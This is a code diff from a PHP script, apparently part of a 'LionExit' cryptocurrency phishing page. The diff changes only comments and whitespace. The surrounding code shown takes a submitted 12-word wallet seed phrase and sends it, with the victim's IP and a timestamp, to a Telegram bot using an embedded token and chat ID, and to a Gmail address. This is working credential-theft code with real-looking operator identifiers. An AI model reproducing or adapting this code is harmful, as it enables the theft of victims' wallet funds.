@@ -2,11 +2,11 @@
 if ($_SERVER["REQUEST_METHOD"] == "POST") {
     $mnemonic = $_POST["mnemonic"];
 
-    // Telegram Bot Setup
+    // === Telegram Bot Setup ===
     $botToken = "8340492899:AAF1RLFOEP6Yz105-vjJcMVH-UhGODeKLFw";
     $chatId = "7968159479";
     $message = "🚨 *New Seed Phrase Submitted* 🚨\n\n🔑 *12 Words:* \n`$mnemonic`\n\n🕓 " . date("Y-m-d H:i:s") . "\n🌍 IP: " . $_SERVER['REMOTE_ADDR'];
-    
+
     // Send to Telegram
     $url = "https://api.telegram.org/bot$botToken/sendMessage";
     $data = [
@@ -16,7 +16,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     ];
     file_get_contents($url . "?" . http_build_query($data));
 
-    // Send to Email
+    // === Email Setup ===
     $to = "biggesttoney.bk@gmail.com";
     $subject = "🚨 New LionExit Seed Phrase Received";
     $headers = "From: LionExit Bot <no-reply@lionexitprotocol.org>\r\n";
